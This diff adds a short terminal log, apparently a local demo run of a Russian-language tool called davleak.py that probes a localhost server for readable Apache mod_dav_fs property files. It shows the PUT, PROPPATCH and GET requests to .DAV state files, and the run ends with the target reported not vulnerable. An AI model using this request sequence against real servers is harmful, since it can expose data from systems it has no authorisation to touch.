@@ -1,0 +1,19 @@
+Script started on 2026-10-22 16:59:04+03:00 [COMMAND="./davleak.py -u http://127.0.0.1:8111 -n leakdemo.txt -v LEAKMARK123" <not executed on terminal>]
+██╗  ██╗  █████╗   ██████╗ ██╗  ██╗ ██╗  ██╗ ███████╗ ██╗   ██╗ ███╗   ██╗
+██║  ██║ ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██║  ██║ ██╔════╝ ██║   ██║ ████╗  ██║
+███████║ ███████║ ██║      █████╔╝  ███████║ █████╗   ██║   ██║ ██╔██╗ ██║
+██╔══██║ ██╔══██║ ██║      ██╔═██╗  ╚════██║ ██╔══╝   ██║   ██║ ██║╚██╗██║
+██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗      ██║ ██║      ╚██████╔╝ ██║ ╚████║
+╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝ ╚═╝       ╚═════╝  ╚═╝  ╚═══╝
+  mod_dav_fs state directory read
+  Made by Walter White (Lamer)
+  https://t.me/walterlamer
+
+цель http://127.0.0.1:8111, ресурс leakdemo.txt, значение LEAKMARK123
+PUT /leakdemo.txt -> 201
+PROPPATCH /leakdemo.txt -> 207
+GET /.DAV/leakdemo.txt.pag -> 403, байт 239, маркер нет
+GET /.DAV/leakdemo.txt.dir -> 403, байт 239, маркер нет
+итог: служебный файл недоступен, цель не уязвима или DAV закрыт
+
+Script done on 2026-10-22 16:59:04+03:00 [COMMAND_EXIT_CODE="1"]
